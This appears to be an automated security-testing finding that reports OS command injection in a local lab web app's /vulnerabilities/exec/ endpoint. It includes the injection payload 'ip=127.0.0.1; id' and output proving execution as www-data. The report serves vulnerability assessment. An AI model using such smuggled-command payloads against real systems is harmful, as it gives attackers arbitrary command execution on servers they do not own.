title: Command Execution (RCE) in /vulnerabilities/exec/
description: The ip parameter in POST to /vulnerabilities/exec/ passes user input directly to shell_exec() or system() without sanitization. Semicolon, pipe, and concatenation operators all allow arbitrary command execution.
poc: Probe request against http://127.0.0.1:8080/vulnerabilities/exec/; observed proving result from prior stage handoff: POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 ti
proof: POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms
